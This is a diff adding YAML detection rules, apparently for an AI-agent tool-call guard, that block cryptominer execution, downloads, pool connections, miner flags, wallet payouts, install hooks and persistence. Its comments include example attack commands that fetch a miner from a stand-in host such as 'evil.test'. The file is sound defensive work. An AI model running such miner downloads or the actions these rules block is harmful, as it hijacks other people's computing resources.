@@ -1,0 +1,275 @@
+# Cryptomining / resource hijacking threat patterns for Singularity AIDR
+# Author: SingularityRD
+# License: DRL-1.1 (see threats/LICENSE)
+# Schema: id, category, severity, confidence, action, pattern, match_on, title, expires_at, revoked
+#
+# MITRE ATT&CK T1496 — Resource Hijacking.
+#
+# Scope of this file: cryptominer binaries, mining-pool connection shapes, miner-only
+# flags, coin wallet payout targets, miner staging/persistence, and package install
+# hooks that pull a miner. Deliberately NOT here: a bare word match on "mining" /
+# "miner" / "hash". Every rule below needs a miner-specific artifact (an executable
+# name at command position, a pool protocol scheme, a miner-only flag, a wallet-shaped
+# payout value, a miner-named package, or a hook line), so ordinary build and VCS
+# commands are untouched.
+#
+# Perf (read before editing): matching runs inside the 15s PreToolUse hook, so every
+# pattern here is linear in the input length. Two idioms are used:
+#   - A single bounded gap (`[\w.-]{1,120}`) where the distance is naturally bounded
+#     (a hostname between a flag and its port).
+#   - A tempered span, `A(?:(?!A)[^\n])*B`, where the anchors can legitimately be far
+#     apart. The negative lookahead repeats the *whole* anchor alternation, which is
+#     what keeps the scan linear: it can never run past the next occurrence of its own
+#     anchor (see CLT-WIN-OBFUS-004 / CLT-MAC-CMD-004 for the same idiom). A tempered
+#     span whose lookahead only guards a subset of the anchor set would be O(n^2).
+# No unbounded `.`/`[^x]`/`\S` gap quantifiers are used (guarded by
+# __tests__/regex-performance.test.ts).
+
+# --- Known miner binaries ---
+
+# Miner executable at command position: start of the command, after a shell
+# separator / quote, or after a path separator. The trailing delimiter keeps
+# `xmrig.md`, `xmrigs` and `docs/xmrig.md` out while still matching `./xmrig`,
+# `/tmp/.cache/xmrig`, `C:\tools\xmrig.exe`, `sudo xmrig` and `bash -c "xmrig …"`.
+- id: "CLT-MINE-001"
+  category: resource_hijacking
+  severity: high
+  confidence: 0.92
+  action: block
+  pattern: "(?:^|[\\s;&|()\"'`/\\\\])(?:xmrig|minerd|cpuminer|ethminer|nbminer|phoenixminer|t-rex|lolminer|gminer|xmr-stak|kawpowminer|srbminer|teamredminer|nanominer|rigelminer|bzminer|wildrig-multi|ccminer|sgminer|bfgminer|cgminer|ethdcrminer64)(?:-(?:amd|nvidia|proxy|multi))?(?:\\.exe)?(?:$|[\\s;&|()\"'`])"
+  case_insensitive: true
+  match_on: command
+  title: "Cryptominer binary execution (MITRE ATT&CK T1496)"
+  expires_at: null
+  revoked: false
+
+# The staged copy is usually fetched first: `curl -fsSL <url>/xmrig-6.21.0.tar.gz -o x`
+# or `iwr https://evil.test/xmrig.exe -OutFile x.exe`. Tempered span so a long URL
+# or flag list cannot hide the miner name, without a gap limit.
+- id: "CLT-MINE-002"
+  category: resource_hijacking
+  severity: high
+  confidence: 0.90
+  action: block
+  pattern: "(?:curl|wget|iwr|Invoke-WebRequest)\\b(?:(?!(?:curl|wget|iwr|Invoke-WebRequest)\\b)[^\\n])*(?:xmrig|minerd|cpuminer|ethminer|nbminer|phoenixminer|t-rex|lolminer|gminer|xmr-stak|kawpowminer|srbminer|teamredminer|nanominer|rigelminer|bzminer|wildrig-multi|ccminer|sgminer|bfgminer|cgminer|ethdcrminer64)\\b"
+  case_insensitive: true
+  match_on: command
+  title: "Cryptominer binary download (MITRE ATT&CK T1496)"
+  expires_at: null
+  revoked: false
+
+# A file write/read whose basename is a miner binary. Anchored so only the leaf
+# name counts: `tools/xmrig` matches, `docs/xmrig.md` does not.
+- id: "CLT-MINE-003"
+  category: resource_hijacking
+  severity: high
+  confidence: 0.88
+  action: block
+  pattern: "(?:^|[/\\\\])(?:xmrig|minerd|cpuminer|ethminer|nbminer|phoenixminer|t-rex|lolminer|gminer|xmr-stak|kawpowminer|srbminer|teamredminer|nanominer|rigelminer|bzminer|wildrig-multi|ccminer|sgminer|bfgminer|cgminer|ethdcrminer64)(?:-(?:amd|nvidia|proxy|multi))?(?:\\.exe)?$"
+  case_insensitive: true
+  match_on: file_path
+  title: "Cryptominer binary file path (MITRE ATT&CK T1496)"
+  expires_at: null
+  revoked: false
+
+# --- Pool connection shapes ---
+
+# Mining pool protocol. `stratum+tcp://` / `stratum+ssl://` have no legitimate use
+# in an agent tool call, so this stays at critical.
+- id: "CLT-MINE-004"
+  category: resource_hijacking
+  severity: critical
+  confidence: 0.95
+  action: block
+  pattern: "stratum://|(?:stratum2?|nicehash|ethproxy|ergo|kawpow|autolykos2)\\+(?:tcp|ssl|udp)://"
+  case_insensitive: true
+  match_on: [command, content, url]
+  title: "Mining pool protocol URL (stratum, MITRE ATT&CK T1496)"
+  expires_at: null
+  revoked: false
+
+# Miner pool endpoint flag: `-o pool.evil.test:3333`, `--url …`, `--pool …`, `-P …`.
+# Single bounded gap for the host and a negative lookahead that excludes the common
+# service ports, so `curl --url localhost:8080` and `ssh -o ProxyJump=…` stay clean
+# while every real pool port (3333/4444/5555/7777/14444/45700/…) matches.
+- id: "CLT-MINE-005"
+  category: resource_hijacking
+  severity: high
+  confidence: 0.90
+  action: block
+  pattern: "(?:^|[\\s;&|()\"'`])(?:-o|-O|-P|--url|--pool|--pool-url|--host)\\s{1,4}[\\w.-]{1,120}:(?!(?:22|25|53|80|110|143|443|587|993|995|3000|3306|5000|5432|6379|8000|8080|8443|9000|27017)(?:$|[\\s;&|()\"'`]))\\d{2,5}(?:$|[\\s;&|()\"'`])"
+  match_on: command
+  title: "Mining pool endpoint in miner connection flag (MITRE ATT&CK T1496)"
+  expires_at: null
+  revoked: false
+
+# Miner pool host:port with a mining-flavoured hostname on a well-known pool port.
+# Weaker than the flag form (a hostname can be reused), so it asks rather than denies.
+- id: "CLT-MINE-006"
+  category: resource_hijacking
+  severity: medium
+  confidence: 0.75
+  action: require_approval
+  pattern: "(?:^|[\\s;&|()\"'`/@])(?:pool|mine|xmr|monero|ethash|ergo|raven|kaspa|hashrate|miner|mining|rig)(?:[\\w.-]{0,90})?:(?:3333|3334|4444|4551|5555|7777|9999|10001|13333|14444|18081|45700)(?:$|[\\s;&|()\"'`])"
+  case_insensitive: true
+  match_on: [command, content]
+  title: "Mining pool host and port (MITRE ATT&CK T1496)"
+  expires_at: null
+  revoked: false
+
+# --- Miner-only flags ---
+
+# `--donate-level` exists only in xmrig. Also matches the JSON config key
+# ("donate-level": 1) so a written miner config is caught.
+- id: "CLT-MINE-007"
+  category: resource_hijacking
+  severity: high
+  confidence: 0.95
+  action: block
+  pattern: "(?:\"?donate-level\"?\\s{0,4}[:=]\\s{0,4}|--donate-level\\s{1,4})\\d{1,3}"
+  case_insensitive: true
+  match_on: [command, content]
+  title: "Miners donation-level flag (MITRE ATT&CK T1496)"
+  expires_at: null
+  revoked: false
+
+# `--cpu-priority` is xmrig/NiceHash-specific (low-priority mining to stay hidden).
+- id: "CLT-MINE-008"
+  category: resource_hijacking
+  severity: high
+  confidence: 0.90
+  action: block
+  pattern: "--cpu-priority(?:=|\\s{1,4})\\d{1,2}"
+  case_insensitive: true
+  match_on: [command, content]
+  title: "Miner CPU-priority flag (MITRE ATT&CK T1496)"
+  expires_at: null
+  revoked: false
+
+# Coin selection on a mining CLI: `--coin MONERO`, `--coin=XMR`, `--coin ETH`.
+- id: "CLT-MINE-009"
+  category: resource_hijacking
+  severity: high
+  confidence: 0.88
+  action: block
+  pattern: "(?:^|[\\s;&|()\"'`])--coin\\s{0,4}=?\\s{0,4}(?:XMR|MONERO|ETH|ETC|RVN|ERGO|ZEPH|KAS|KASPA|ALPH|XNA|BTC|LTC|DOGE|KDA|FLUX|NEXA|CFX|DERO|TON)(?:$|[\\s;&|()\"'`])"
+  case_insensitive: true
+  match_on: command
+  title: "Miner coin selection flag (MITRE ATT&CK T1496)"
+  expires_at: null
+  revoked: false
+
+# Mining algorithm selection. Only algorithms that are miner-specific are listed:
+# generic hashes (sha256, scrypt, equihash) are deliberately excluded because they
+# are used by ordinary tooling.
+- id: "CLT-MINE-010"
+  category: resource_hijacking
+  severity: high
+  confidence: 0.90
+  action: block
+  pattern: "(?:^|[\\s;&|()\"'`])(?:-a|--algo|--algorithm)\\s{1,4}(?:cryptonight|randomx|kawpow|ethash|etchash|autolykos2|kheavyhash|ghostrider|progpow|firopow|yescrypt|rx/0|rx/wow|cn-heavy|cn-pico|cn-lite|cn/gpu)(?:$|[\\s;&|()\"'`])"
+  case_insensitive: true
+  match_on: command
+  title: "Miner algorithm flag (cryptonight/randomx/ethash, MITRE ATT&CK T1496)"
+  expires_at: null
+  revoked: false
+
+# A renamed miner binary still betrays itself: `--threads 8` is only interesting
+# when the same command also opens a pool connection. The tempered span repeats the
+# whole `--threads` anchor so a flood of `--threads` cannot make the scan quadratic.
+# A build flag on its own (`npx tsc --threads 4`) has no pool and stays clean.
+- id: "CLT-MINE-011"
+  category: resource_hijacking
+  severity: high
+  confidence: 0.88
+  action: block
+  pattern: "--threads(?:=|\\s{1,4})\\d{1,4}(?:(?!--threads)[^\\n])*(?:stratum://|(?:stratum2?|nicehash|ethproxy|ergo|kawpow|autolykos2)\\+(?:tcp|ssl|udp)://|--donate-level|(?:-o|-O|-P|--url|--pool|--pool-url|--host)\\s{1,4}[\\w.-]{1,120}:\\d{2,5})"
+  case_insensitive: true
+  match_on: command
+  title: "Miner thread count combined with a pool connection (MITRE ATT&CK T1496)"
+  expires_at: null
+  revoked: false
+
+# --- Wallet payout targets ---
+# Not case-insensitive on purpose: base58 excludes 0/O/I/l, and an `i` flag would
+# readmit them.
+
+- id: "CLT-MINE-012"
+  category: resource_hijacking
+  severity: high
+  confidence: 0.92
+  action: block
+  pattern: "(?:^|[\\s;&|()\"'`])(?:-u|--user|-p|--pass|--wallet|--address|--coinbase-addr|--rig-id)(?:=|\\s{1,4})(?:4[1-9A-HJ-NP-Za-km-z]{105}|[48][1-9A-HJ-NP-Za-km-z]{94}|0x[a-fA-F0-9]{40})(?:$|[\\s;&|()\"'`])"
+  match_on: command
+  title: "Wallet-shaped crypto address used as miner payout target (MITRE ATT&CK T1496)"
+  expires_at: null
+  revoked: false
+
+- id: "CLT-MINE-013"
+  category: resource_hijacking
+  severity: high
+  confidence: 0.90
+  action: block
+  pattern: "\\b(?:[48][1-9A-HJ-NP-Za-km-z]{105}|[48][1-9A-HJ-NP-Za-km-z]{94})\\b"
+  match_on: command
+  title: "Monero wallet address in command (95/106-char base58, MITRE ATT&CK T1496)"
+  expires_at: null
+  revoked: false
+
+# Ethereum payout address is only meaningful here next to a pool. `0x` + 40 hex on
+# its own appears in ordinary contract/config work, so it is not flagged alone.
+- id: "CLT-MINE-014"
+  category: resource_hijacking
+  severity: high
+  confidence: 0.88
+  action: block
+  pattern: "0x[a-fA-F0-9]{40}(?:(?!(?:0x[a-fA-F0-9]{40}))[^\\n])*(?:stratum://|(?:stratum2?|nicehash|ethproxy|ergo|kawpow|autolykos2)\\+(?:tcp|ssl|udp)://|--donate-level|(?:-o|-O|-P|--url|--pool|--pool-url|--host)\\s{1,4}[\\w.-]{1,120}:\\d{2,5})"
+  match_on: command
+  title: "Ethereum payout address next to a mining pool (MITRE ATT&CK T1496)"
+  expires_at: null
+  revoked: false
+
+# --- Package install hooks and staging ---
+
+# npm/pip install hook that stages a miner: the shape of a malicious dependency's
+# postinstall. The hook keyword is required, so a README that merely mentions a
+# miner is not flagged.
+- id: "CLT-MINE-015"
+  category: resource_hijacking
+  severity: high
+  confidence: 0.88
+  action: block
+  pattern: "(?:\"|')?(?:postinstall|preinstall|post-install|pre_install|install_requires|cmdclass)(?:\"|')?\\s{0,4}[:=]?[^\\n]{0,200}(?:xmrig|minerd|cpuminer|ethminer|nbminer|phoenixminer|lolminer|xmr-stak|stratum://|(?:stratum2?|nicehash)\\+(?:tcp|ssl|udp)://|--donate-level|--cpu-priority|cryptonight)"
+  case_insensitive: true
+  match_on: content
+  title: "Package install hook staging a cryptominer (MITRE ATT&CK T1496)"
+  expires_at: null
+  revoked: false
+
+# Installing a package whose name is a miner binary/wrapper.
+- id: "CLT-MINE-016"
+  category: resource_hijacking
+  severity: high
+  confidence: 0.88
+  action: block
+  pattern: "(?:^|[\\s;&|()\"'`])(?:npm|pnpm|yarn|bun|pip|pip3|poetry|uv)\\s{1,4}(?:i|install|add|run|exec|dlx)?\\s{0,4}(?:@[\\w.-]{1,40}[/\\\\])?(?:xmrig|minerd|cpuminer|ethminer|nbminer|phoenixminer|lolminer|xmr-stak|kawpowminer|srbminer|teamredminer|nanominer|rigelminer|bzminer|ccminer|sgminer|cgminer)(?:[\\w.-]{0,40})"
+  case_insensitive: true
+  match_on: command
+  title: "Package install of a miner package (MITRE ATT&CK T1496)"
+  expires_at: null
+  revoked: false
+
+# --- Persistence of a miner ---
+
+# Scheduler/service registration pointing at a miner or a pool. Single bounded gap.
+- id: "CLT-MINE-017"
+  category: resource_hijacking
+  severity: high
+  confidence: 0.88
+  action: block
+  pattern: "(?:^|[\\s;&|()\"'`])(?:crontab|systemctl|launchctl|schtasks|@reboot|rc\\.local|systemd|Task Scheduler|cron)[^\\n]{0,200}(?:xmrig|minerd|cpuminer|ethminer|nbminer|phoenixminer|lolminer|xmr-stak|stratum://|(?:stratum2?|nicehash)\\+(?:tcp|ssl|udp)://|--donate-level)(?:$|[\\s;&|()\"'`])"
+  case_insensitive: true
+  match_on: [command, content]
+  title: "Miner registered for persistence (cron/systemd/launchd, MITRE ATT&CK T1496)"
+  expires_at: null
+  revoked: false
